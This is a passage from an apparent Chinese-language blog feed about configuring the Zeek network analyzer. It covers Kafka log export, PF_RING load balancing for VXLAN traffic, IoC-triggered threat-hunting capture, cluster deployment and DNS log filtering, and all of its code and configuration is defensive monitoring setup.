<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">module</span> Enrichment;</span><br><span class="line"></span><br><span class="line">redef record HTTP::Info += &#123;</span><br><span class="line">    extract:    <span class="keyword">bool</span>        &amp;<span class="keyword">default</span>=F &amp;log;</span><br><span class="line">    domain:     string      &amp;optional &amp;log;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">hook <span class="title">HTTP::log_policy</span><span class="params">(rec: HTTP::Info, id: Log::ID, filter: Log::Filter)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ( filter$name != <span class="string">&quot;http_extraction&quot;</span> )</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( rec$extract == F )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function">event <span class="title">zeek_init</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    local filter: Log::Filter = [$name=<span class="string">&quot;http_extraction&quot;</span>, $path=<span class="string">&quot;http-extraction&quot;</span>];</span><br><span class="line">    Log::<span class="built_in">add_filter</span>(HTTP::LOG, filter);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> &#123;</span><br><span class="line">    global http: <span class="built_in">function</span>(f: fa_file): fa_file;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">function <span class="title">http</span><span class="params">(f: fa_file)</span>: fa_file</span></span><br><span class="line"><span class="function">    &#123;</span></span><br><span class="line">    f$http$extract = T;</span><br><span class="line">    f$http$domain = f$http$host;</span><br><span class="line">    <span class="keyword">return</span> f;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>kafka/http_extraction-to-kafka.zeek</p>
<p>​    利用<a href="https://docs.zeek.org/en/v4.2.2/scripts/base/frameworks/logging/main.zeek.html?highlight=Log::Filter#id-Log::get_filter"><strong>Log::get_filter</strong></a>方法获取过滤器(<em>http_extraction</em>)，通过将写入器修改为<em>WRITER_KAFKAWRITER</em>。最终实现将命中文件还原的HTTP事件通过指定topic（<em>zeek-http_extraction</em>）发送到Kafka。</p>
</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">event <span class="title">zeek_init</span><span class="params">()</span> &amp;priority</span>=<span class="number">-10</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta"># handles HTTP</span></span><br><span class="line">  	local f = Log::<span class="built_in">get_filter</span>(HTTP::LOG, <span class="string">&quot;http_extraction&quot;</span>);</span><br><span class="line">  	f$writer = Log::WRITER_KAFKAWRITER;</span><br><span class="line">    f$config = <span class="built_in">table</span>([<span class="string">&quot;topic_name&quot;</span>] = <span class="string">&quot;zeek-http_extraction&quot;</span>);</span><br><span class="line">    Log::<span class="built_in">add_filter</span>(HTTP::LOG, f);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>场景2：算是场景1进行扩展，在保留HTTP文件还原的日志前提下，将全量的HTTP数据发送到指定的topic（zeek-http）。</p>
<ul>
<li>kafka/kafka-config.zeek</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">redef Kafka::kafka_conf = <span class="built_in">table</span>(</span><br><span class="line">    [<span class="string">&quot;metadata.broker.list&quot;</span>] = <span class="string">&quot;node-1:9092,node-2:9092,node-3:9092&quot;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<ul>
<li>kafka/http-to-kafka.zeek</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">event <span class="title">zeek_init</span><span class="params">()</span> &amp;priority</span>=<span class="number">-10</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta"># handles HTTP</span></span><br><span class="line">  	local f = Log::<span class="built_in">get_filter</span>(HTTP::LOG, <span class="string">&quot;default&quot;</span>);</span><br><span class="line">  	f$writer = Log::WRITER_KAFKAWRITER;</span><br><span class="line">    f$config = <span class="built_in">table</span>([<span class="string">&quot;topic_name&quot;</span>] = <span class="string">&quot;zeek-http&quot;</span>);</span><br><span class="line">    Log::<span class="built_in">add_filter</span>(HTTP::LOG, f);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h4 id="对比"><a href="#对比" class="headerlink" title="对比"></a>对比</h4><p>​    这里用PCAP包回放的形式给大家验证一下前后的对比，为了便于验证，我这里只针对HTTP数据送入到了Kafka。</p>
<ul>
<li><p>修改前</p>
<ul>
<li>回放http.pcap，本地会留存 http.log</li>
<li>回放http_extraction.pcap，本地会留存http-extraction.log</li>
</ul>
<p><img src="/2022/07/11/Zeek-Log-to-Kafka-%E7%A1%AC%E7%9B%98%E8%88%92%E6%9C%8D%E4%BA%86/%E6%9C%AC%E5%9C%B0%E6%97%A5%E5%BF%97.gif" alt="image-20220716232345238"></p>
</li>
<li><p>修改后</p>
<ul>
<li>回放http.pcap，本地无http.log。topic: zeek-http，存在日志</li>
<li>回放http_extraction.pcap，本地无http-extraction.log。topic: zeek-http_extraction，存在日志</li>
</ul>
<p><img src="/2022/07/11/Zeek-Log-to-Kafka-%E7%A1%AC%E7%9B%98%E8%88%92%E6%9C%8D%E4%BA%86/Kafka%E6%97%A5%E5%BF%97.gif" alt="image-20220716232345238"></p>
</li>
</ul>
<h4 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h4><p>​    下一篇 《Zeek-Kafka 之 机器受不了!》将会向大家介绍，若想在实际环境中完全发挥<a href="https://github.com/SeisoLLC/zeek-kafka"><strong>Zeek-Kafka</strong></a>插件的能力，我们的架构也需要进行一些调整，一起探索Zeek集群的模式吧。</p>
<p><img src="https://docs.zeek.org/en/v4.2.2/_images/deployment.png" alt="_images/deployment.png"></p>
]]></content>
      <categories>
        <category>NTA</category>
      </categories>
      <tags>
        <tag>Zeek</tag>
        <tag>NTA</tag>
      </tags>
  </entry>
  <entry>
    <title>Zeek-PF_RING inner-5-tuple Load Balance</title>
    <url>/2023/04/07/Zeek-PF-RING-Load-Balance/</url>
    <content><![CDATA[<h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><p>​    早在2019年AWS刚对外发布“Traffic Mirroring” 测试的时候，作为国内最早一批吃“螃蟹”的用户，期间各种试错、填坑之后，“怒”写下了“<a href="https://canon88.github.io/2019/10/16/%E6%88%91%E5%9C%A8%E4%BA%91%E4%B8%8A%E7%9A%84%E6%97%A5%E5%AD%90-AWS%E4%B8%8A%E6%B5%81%E9%87%8F%E9%95%9C%E5%83%8F%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91/">我在’云’上的日子 - AWS上流量镜像遇到的坑</a>”。也幸好是前期积累的经验，在之后其他云平台上使用云原生的“Traffic Mirroring”对接NTA时更加“丝滑”，毕竟做安全的哪有不监控流量的？！</p>
<p>​    本篇文章介绍的情况恰巧相反。假设，你目前所在的云平台暂不支持“Traffic Mirroring”你会怎么做？当然，我们可以通过安装agent的形式将流量发出来，这也是在云原生支持“Traffic Mirroring”之前的通用做法。如今这类的agent不少，开源的有，商业的也有。恰巧我现在就在使用某商业产品，不过很“蠢”的是该产品通过VXLAN发送数据的时候源端口竟然<strong>是固定的</strong>。正因为这个问题，引出了这篇文章。</p>
<p>​    当你使用tcpdump的时候，你会看到这样的情况。其中，192.168.199.100是数据源，192.168.199.200 是NTA。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo tcpdump -nni eth1 -c 100 | grep 4789</span><br><span class="line"></span><br><span class="line">23:52:25.748497 IP 192.168.199.100.49152 &gt; 192.168.199.200.4789: VXLAN, flags [I] (0x08), vni 1</span><br><span class="line">23:52:25.748498 IP 192.168.199.100.49152 &gt; 192.168.199.200.4789: VXLAN, flags [I] (0x08), vni 1</span><br><span class="line">23:52:25.748505 IP 192.168.199.100.49152 &gt; 192.168.199.200.4789: VXLAN, flags [I] (0x08), vni 1</span><br><span class="line">23:52:25.748530 IP 192.168.199.100.49152 &gt; 192.168.199.200.4789: VXLAN, flags [I] (0x08), vni 1</span><br></pre></td></tr></table></figure>

<p>​    大家都知道，Zeek配合PF_RING之后是支持基于多进程的流量负载均衡的。PF_RING默认的负载均衡是基于5-tuple来进行的。也就是基于5元组进行的HASH，同一个HASH分配到同一个进程。由于我的数据流五元组是一样的，导致我开了16个进程的Zeek只有1个进程是满负载，其他的15个进程是“空转”的。也导致了流量一大就出现了丢包的问题。</p>
<h4 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h4><p>​    不得不说一句Zeek的开源社区非常的活跃，在Slack上提问了相关问题后，大佬们就给出了“解题思路”。解决方案也很简单将 test_cluster_types设置为<code>inner-5-tuple</code>。</p>
<p>​    inter 含义 引用原文：<em>This PR adds support for the more recent “INNER” clustering strategies of PF_RING. These allow load balancing according to the IP addresses and ports inside (for instance) GRE tunnels, rather than according to the tunnel’s IP. This was leading to huge balancing issues on some sensors we run.</em></p>
<p>这里需要关注一下几个点：</p>
<ul>
<li><p>PF_RING <strong>8.2</strong> 版本集成了该功能，所以对PF_RING版本有要求</p>
</li>
<li><p><a href="https://github.com/zeek/zeekctl">zeekctl</a>版本有要求，ZeekControl version 2.5.0-5包含了此代码</p>
<p><img src="/2023/04/07/Zeek-PF-RING-Load-Balance/2.png" alt="image-20230411112133033"></p>
</li>
</ul>
<p>修改后的Zeek配置文件代码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ more /usr/<span class="built_in">local</span>/zeek/etc/zeekctl.cfg</span><br><span class="line"></span><br><span class="line">PFRINGClusterID = 99</span><br><span class="line">PFRINGClusterType = inner-5-tuple</span><br></pre></td></tr></table></figure>



<p>修改前</p>
<p><img src="/2023/04/07/Zeek-PF-RING-Load-Balance/1.png" alt="image-20230407232532950"></p>
<p>修改后</p>
<p><img src="/2023/04/07/Zeek-PF-RING-Load-Balance/3.png" alt="image-20230411112934287"></p>
<h5 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h5><ul>
<li><a href="https://github.com/zeek/zeekctl/pull/40/files/c44382aea866925d884e88df3acc51d687986593">pf_ring: add new ‘inner’ load balancing strategies </a></li>
<li><a href="https://community.zeek.org/t/how-to-confige-the-cluster-type-using-pf-ring-doing-loadbalance/6809"><a href="https://community.zeek.org/t/how-to-confige-the-cluster-type-using-pf-ring-doing-loadbalance/6809">How to confige the “cluster type” using PF_RING doing loadbalance</a></a></li>
</ul>
]]></content>
      <categories>
        <category>NTA</category>
      </categories>
      <tags>
        <tag>Zeek</tag>
        <tag>NTA</tag>
      </tags>
  </entry>
  <entry>
    <title>Zeek-ThreatHunting</title>
    <url>/2024/02/25/Zeek-ThreatHunting/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>春节期间，我利用课余时间将之前的一些想法付诸实践。我们都知道，网络威胁分析(NTA)除了具备网络入侵检测系统(NIDS)功能外，还有一个重要特性就是强大的协议解析能力，这对于安全事件的溯源提供了极大的帮助。然而，并非所有的企业都能充分利用这个能力，主要原因有两个方面：</p>
<ol>
<li><strong>存储成本</strong>：如果需要进行全面的网络元数据捕获，它的存储成本将会是一个“挑战”。因为，你的网络流量越大也就意味着你的存储成本越高。</li>
<li><strong>隐私合规</strong>：如果你所在公司的数据安全成熟度不高且公司业务又面临强合规监管。那么，合规法案将会在一定程度上与数据捕获的需求“冲突”。</li>
</ol>
<p>所以，如果你和我一样在工作中即需要满足安全需求又需要考虑这么做是否合规，那么我相信本篇文章会对你有一些帮助，既在满足合规的前提下为威胁狩猎提供更多的网络元数据。</p>
<h4 id="需求概述"><a href="#需求概述" class="headerlink" title="需求概述"></a>需求概述</h4><p>当触发告警时，Zeek可以从Kafka获取IoC并根据指定时间窗口进行数据捕获。</p>
<h4 id="实现步骤"><a href="#实现步骤" class="headerlink" title="实现步骤"></a>实现步骤</h4><ol>
<li><p>首先，需要搞定如何让Zeek连接Kafka。好消息是，Zeek v6.0已经支持通过<a href="https://zeekjs.readthedocs.io/en/latest/#">ZeekJS</a>插件加载并执行JavaScript代码。有了JavaScript的加持，一切皆有可能！</p>
</li>
<li><p>其次，需要尝试为IoC设置过期时间。Zeek本身对部分类型是支持过期时间这个属性的，借助<a href="https://docs.zeek.org/en/current/script-reference/attributes.html#attr-&create_expire">create_expire</a>这个属性再加上<a href="https://docs.zeek.org/en/current/frameworks/intel.html">Intelligence Framework</a>就可以为每个IoC设置不同的过期时间。这里给大家推荐<a href="https://github.com/J-Gras">J-Gras</a>的<a href="https://github.com/J-Gras/intel-expire">intel-expire</a>项目，我们就不用“重复造轮子”了。</p>
</li>
<li><p>最后，使用<code>Intel::LOG</code>作为触发器捕获元数据。这里需要使用Zeek的<a href="https://docs.zeek.org/en/current/frameworks/intel.html">Intelligence Framework</a>来对IoC进行实时的匹配，你可以将<code>Intel::LOG</code>视为一个触发器，一旦匹配到之后将会自动捕获与之对应的uid事件。这里需要使用Zeek v6.2，目前还没release，尝鲜的话可以先用 zeek version 6.2.0-dev 。</p>
</li>
</ol>
<p><em>这里需要说明一点，Zeek中负责嗅探网络流量并解析协议的是Worker角色，所以我们的需求落实到代码层面也必须让Worker角色来执行。由于当前Intel::match()方法作用域是在Manager上而并非在Worker上。因此，它并不能满足我们当前的需求，好消息是 Zeek v6.2 版本将会支持，届时我们可以使用Intel::seen_policy()来实现。这里有个例外，如果你的环境中Zeek是非集群架构的话，因为Manager和Worker都在一台机器上，所以，就不存在这个问题了，直接使用Intel::match()就行了。若想了解更多关于Zeek架构方面的知识，请参考：<a href="https://docs.zeek.org/en/current/cluster-setup.html#cluster-architecture">Cluster-architecture</a></em></p>
<h4 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h4><p>解决了上述三个问题之后，它的工作流程应该是这样的：</p>
<p><img src="/2024/02/25/Zeek-ThreatHunting/Workflow.png" alt="Workflow"></p>
<h5 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ tree threat-hunting</span><br><span class="line">threat-hunting</span><br><span class="line">├── config.dat</span><br><span class="line">├── config.zeek</span><br><span class="line">├── __load__.zeek</span><br><span class="line">├── main.zeek</span><br><span class="line">├── plugins</span><br><span class="line">│   ├── conn</span><br><span class="line">│   │   ├── investigation.zeek</span><br><span class="line">│   ├── dns</span><br><span class="line">│   │   ├── investigation.zeek</span><br><span class="line">│   ├── http</span><br><span class="line">│   │   ├── investigation.zeek</span><br><span class="line">│   │   └── normalized.zeek</span><br><span class="line">│   └── __load__.zeek</span><br><span class="line">└── threathunting.js</span><br></pre></td></tr></table></figure>

<h5 id="脚本说明"><a href="#脚本说明" class="headerlink" title="脚本说明"></a>脚本说明</h5><table>
<thead>
<tr>
<th align="left">Script</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td align="left">main.zeek</td>
<td>主程序，通过ZeekJS调用 <code>threathunting.js</code></td>
</tr>
<tr>
<td align="left">config.dat</td>
<td>配置文件，无需重启Zeek控制指定plugin的启用与禁用。你会经常用到它</td>
</tr>
<tr>
<td align="left">plugins</td>
<td>插件目录，用户自定义的插件目录。你会经常用到它</td>
</tr>
</tbody></table>
<h4 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用"></a>如何使用</h4><p>让我们动手，编写一个自己的插件！</p>
<p>通常你只需要创建一个<code>investigation.zeek</code>脚本，并编辑<code>Intel::seen_policy</code>与<code>HTTP::log_policy</code>中的内容即可。如果你对日志标准化有需求也可以创建一个<code>normalized.zeek</code>来实现标准化。下面以创建<code>./plugins/http/investigation.zeek</code>为示例：</p>
<ul>
<li><p>首先，为你所需要的日志增加一个类型为<code>bool</code>的 <code>threathunting</code> 字段，这里是 <code>HTTP::Info</code></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">redef record HTTP::Info += &#123;</span><br><span class="line">    threathunting: <span class="keyword">bool</span> &amp;log &amp;optional;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
<li><p>然后，使用 <strong>Intel::seen_policy</strong> 在匹配到情报时将<code>threathunting</code>字段设置为<strong>True</strong>。对了，这里<code>HTTP</code>记得添加<strong>config.dat</strong>中<code>ThreatHunting::enable_module HTTP</code>，它将用来控制插件的热启停。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"># Hook <span class="keyword">for</span> filtering Intel log entries based on predefined criteria.</span><br><span class="line"><span class="function">hook <span class="title">Intel::seen_policy</span><span class="params">(s: Intel::Seen, found: <span class="keyword">bool</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    # Break <span class="keyword">if</span> there is no match.</span><br><span class="line">    <span class="keyword">if</span> ( ! found )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">    # Check <span class="keyword">if</span> the current log entry matches the set investigation criteria.</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="string">&quot;HTTP&quot;</span> in enable_module) &amp;&amp; (s$conn?$http) )</span><br><span class="line">        s$conn$http$threathunting = T;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>最后，使用 <strong>HTTP::log_policy</strong> 对 <code>threathunting</code> 字段为<strong>True</strong>的日志进行捕获，搞定！是不是很简单？</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">hook <span class="title">HTTP::log_policy</span><span class="params">(rec: HTTP::Info, id: Log::ID, filter: Log::Filter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ( filter$name == <span class="string">&quot;http_investigation&quot;</span> ) &#123;</span><br><span class="line">        <span class="keyword">if</span> (! rec?$threathunting) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="功能演示"><a href="#功能演示" class="headerlink" title="功能演示"></a>功能演示</h4><p><img src="/2024/02/25/Zeek-ThreatHunting/threathunting.gif" alt="threathunting"></p>
<ol>
<li><p>这里通过推送IoC(httpbin.org)到Kafka，设置过期时间为60秒；</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;ioc&quot;</span>: <span class="string">&quot;httpbin.org&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;domain&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;meta&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;expire&quot;</span>: <span class="number">60</span>,</span><br><span class="line">        <span class="attr">&quot;source&quot;</span>: <span class="string">&quot;SOAR&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;desc&quot;</span>: <span class="string">&quot;bad domain&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>模拟访问httpbin.org时将会触发<strong>Intel::LOG</strong>以及<strong>HTTP::LOG</strong></p>
</li>
<li><p>60秒之后再次尝试访问httpbin.org，未生成<strong>Intel::LOG</strong>以及<strong>HTTP::LOG</strong>，因为IoC已过期。</p>
</li>
</ol>
<h4 id="让ChatGPT给上个“价值”"><a href="#让ChatGPT给上个“价值”" class="headerlink" title="让ChatGPT给上个“价值”"></a>让ChatGPT给上个“价值”</h4><p>总的来说，使用Zeek进行威胁狩猎的过程在解决存储成本和隐私合规两大问题上展现了显著的优势。Zeek能够从Kafka获取IoC并在指定的时间窗口内进行数据捕获，有效地降低了存储成本。同时，利用Zeek的Intelligence Framework和intel-expire项目设置IoC的过期时间，避免了无限捕获带来的性能损耗，同时也确保了隐私合规。此外，编写自定义插件的功能为用户提供了极大的便利性和灵活性。值得一提的是，这个方案不仅在安全领域有着广泛的应用，也可以有效地应用于其他非安全的场景，如故障排错，从而发挥出更大的价值。</p>
]]></content>
      <categories>
        <category>NTA</category>
      </categories>
      <tags>
        <tag>Zeek</tag>
      </tags>
  </entry>
  <entry>
    <title>Zeek - 集群部署模式</title>
    <url>/2021/03/02/Zeek-%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p><strong><a href="https://software.opensuse.org/download.html?project=security:zeek&package=zeek">在线安装</a></strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">&#x27;deb http://download.opensuse.org/repositories/security:/zeek/Debian_10/ /&#x27;</span> | sudo tee /etc/apt/sources.list.d/security:zeek.list</span><br><span class="line">$ curl -fsSL https://download.opensuse.org/repositories/security:zeek/Debian_10/Release.key | gpg --dearmor | sudo tee /etc/apt/trusted.gpg.d/security_zeek.gpg &gt; /dev/null</span><br><span class="line">$ sudo apt update</span><br><span class="line">$ sudo apt install zeek</span><br></pre></td></tr></table></figure>





<h4 id="架构图"><a href="#架构图" class="headerlink" title="架构图"></a>架构图</h4><p><img src="https://docs.zeek.org/en/master/_images/deployment.png" alt="_images / deployment.png"></p>
<p><strong>Manager -&gt; Worker</strong></p>
<ol>
<li>在设置集群时，必须在所有主机上设置Zeek用户，并且该用户必须能够从管理器中对集群中的所有机器进行ssh访问，并且必须在不被提示密码/口令的情况下工作（例如，使用ssh公钥认证）。另外，在工作节点上，该用户必须能够以混杂模式访问目标网络接口。</li>
<li>存储必须在同一路径下的所有主机上可用。</li>
</ol>
<h5 id="Manager"><a href="#Manager" class="headerlink" title="Manager"></a>Manager</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装Zeek 略过</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成SSH Key</span></span><br><span class="line">$ ssh-keygen</span><br><span class="line"></span><br><span class="line"><span class="comment"># 记得Worker节点需要创建.ssh目录</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制ssh pub到Zeek Worker</span></span><br><span class="line">$ scp /root/.ssh/id_rsa.pub root@Zeek-Worker1:~/.ssh/authorized_keys2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置Manager node.cfg</span></span><br><span class="line">$ vim /opt/zeek/etc/node.cfg</span><br><span class="line">[logger-1]</span><br><span class="line"><span class="built_in">type</span>=logger</span><br><span class="line">host=Zeek-Manager</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">[manager]</span><br><span class="line"><span class="built_in">type</span>=manager</span><br><span class="line">host=Zeek-Manager</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">[proxy-1]</span><br><span class="line"><span class="built_in">type</span>=proxy</span><br><span class="line">host=Zeek-Manager</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">[worker-1]</span><br><span class="line"><span class="built_in">type</span>=worker</span><br><span class="line">host=Zeek-Worker1</span><br><span class="line">interface=ens224</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">[worker-2]</span><br><span class="line"><span class="built_in">type</span>=worker</span><br><span class="line">host=Zeek-Worker2</span><br><span class="line">interface=ens224</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查Zeek</span></span><br><span class="line">$ zeekctl</span><br><span class="line">[ZeekControl] &gt; check</span><br><span class="line">logger-1 scripts are ok.</span><br><span class="line">manager scripts are ok.</span><br><span class="line">proxy-1 scripts are ok.</span><br><span class="line">worker-1 scripts are ok.</span><br><span class="line">worker-2 scripts are ok.</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动Zeek</span></span><br><span class="line">$ zeekctl</span><br><span class="line">[ZeekControl] &gt; start</span><br><span class="line">starting logger ...</span><br><span class="line">starting manager ...</span><br><span class="line">starting proxy ...</span><br><span class="line">starting workers ...</span><br></pre></td></tr></table></figure>



<h4 id="集群中性能是否对于单台有优化待测试"><a href="#集群中性能是否对于单台有优化待测试" class="headerlink" title="集群中性能是否对于单台有优化待测试"></a>集群中性能是否对于单台有优化待测试</h4>]]></content>
      <tags>
        <tag>Zeek</tag>
      </tags>
  </entry>
  <entry>
    <title>Zeek - 高度定制化的 DNS事件 + 文件还原</title>
    <url>/2020/05/11/Zeek%E5%AE%9E%E6%88%98-1/</url>
    <content><![CDATA[<h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><ol>
<li><p>本地环境中部署了2台NTA（<strong>Suricata</strong>）接收内网12台DNS服务器的流量，用于发现DNS请求中存在的安全问题。近一段时间发现2台NTA服务器运行10小时左右就会自动重启<strong>Suricata</strong>进程，看了一下日志大概意思是说内存不足，需要强制重启释放内存。说起这个问题当时也是花了一些时间去定位。首先DNS这种小包在我这平均流量也就25Mbps，所以大概率不是因为网卡流量过大而导致的。继续定位，由于我们这各个应用服务器会通过内网域名的形式进行接口调用，所以DNS请求量很大。<strong>Kibana</strong>上看了一下目前<code>dns_type: query</code>事件的数据量<strong>320,000,000/天 ~ 350,000,000/天</strong>（这仅仅是<code>dns_type: query</code>数据量，<code>dns_type: answer </code>数据量<strong>也超级大</strong>）。由于<strong>Suricata</strong>不能在数据输出之前对指定域名进行过滤，这一点确实<strong>很傻</strong>，<strong>必须吐槽</strong>。当时的规避做法就是只保留<code>dns_type: query</code>事件，既保证了<strong>Suricata</strong>的正常运行也暂时满足了需求。</p>
</li>
<li><p>近一段时间网站的某个上传接口被上传了包含<strong>恶意Payload</strong>的jpg与png。虽然<strong>Suricata</strong>有检测到，但也延伸了新的需求，如何判断文件是否上传成功以及文件还原与提取<strong>HASH</strong>。虽然这两点<strong>Suricata</strong>自身都可以做，但是有一个弊端不得不说。例如<strong>Suricata</strong>只要开启<code>file_info</code>就会对所有支持文件还原的协议进行<strong>HASH</strong>提取。由于我们是电商，外部访问的数据量会很大，<strong>Suricata</strong>默认不支持过滤，针对用户访问的HTML网页这种也会被计算一个<strong>HASH</strong>，这个量就非常的<strong>恐怖</strong>了。</p>
</li>
</ol>
<p><strong>总结：</strong>针对以上2个问题，我需要的是一个更加灵活的NTA框架，下面请来本次主角 - <strong>Zeek</strong>。</p>
<hr>
<h4 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h4><ol>
<li>过滤内部DNS域名，只保留外部DNS域名的请求与响应数据；</li>
<li>更灵活的文件还原与提取HASH;</li>
</ol>
<hr>
<h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><h5 id="1-过滤本地DNS请求"><a href="#1-过滤本地DNS请求" class="headerlink" title="1. 过滤本地DNS请求"></a>1. 过滤本地DNS请求</h5><h6 id="DNS脚本"><a href="#DNS脚本" class="headerlink" title="DNS脚本"></a>DNS脚本</h6><p><strong>dns-filter_external.zeek</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">redef Site::local_zones = &#123;<span class="string">&quot;canon88.github.io&quot;</span>, <span class="string">&quot;baidu.com&quot;</span>, <span class="string">&quot;google.com&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> dns_filter(rec: DNS::Info): bool</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="built_in">return</span> ! Site::is_local_name(rec<span class="variable">$query</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">redef Analyzer::disable_all = T</span><br><span class="line"></span><br><span class="line">event <span class="function"><span class="title">zeek_init</span></span>()</span><br><span class="line">  &#123;</span><br><span class="line">  Analyzer::enable_analyzer(Analyzer::ANALYZER_VXLAN);</span><br><span class="line">  Analyzer::enable_analyzer(Analyzer::ANALYZER_DNS);</span><br><span class="line">  Log::remove_default_filter(DNS::LOG);</span><br><span class="line">  <span class="built_in">local</span> filter: Log::Filter = [<span class="variable">$name</span>=<span class="string">&quot;dns_split&quot;</span>, <span class="variable">$path</span>=<span class="string">&quot;/data/logs/zeek/dns_remotezone&quot;</span>, <span class="variable">$pred</span>=dns_filter];</span><br><span class="line">  Log::add_filter(DNS::LOG, filter);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<h6 id="脚本简述："><a href="#脚本简述：" class="headerlink" title="脚本简述："></a>脚本简述：</h6><ol>
<li><p>通过<code>Site::local_zones</code>定义一个内部的域名，这些域名默认都是我们需要过滤掉的。例如，在我的需求中，多为内网的域名；</p>
<ol start="2">
<li>优化性能， 只开启DNS流量解析。由于这2台NTA只负责解析DNS流量，为了保留针对域名特征检测的能力，我选择了<strong>Suricata</strong>与<strong>Zeek</strong>共存，当然<strong>Zeek</strong>也可以做特征检测，只是我懒。。。通过<code>Analyzer::enable_analyzer(Analyzer::ANALYZER_DNS);</code>指定了只对DNS流量进行分析；</li>
<li>过滤日志并输出；</li>
</ol>
</li>
</ol>
<h6 id="日志样例："><a href="#日志样例：" class="headerlink" title="日志样例："></a>日志样例：</h6><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;ts&quot;</span>: <span class="number">1589175829.994196</span>,</span><br><span class="line">  <span class="attr">&quot;uid&quot;</span>: <span class="string">&quot;CPRxOZ2RtkPYhjz8R9&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;id.orig_h&quot;</span>: <span class="string">&quot;1.1.1.1&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;id.orig_p&quot;</span>: <span class="number">40411</span>,</span><br><span class="line">  <span class="attr">&quot;id.resp_h&quot;</span>: <span class="string">&quot;2.2.2.2&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;id.resp_p&quot;</span>: <span class="number">53</span>,</span><br><span class="line">  <span class="attr">&quot;proto&quot;</span>: <span 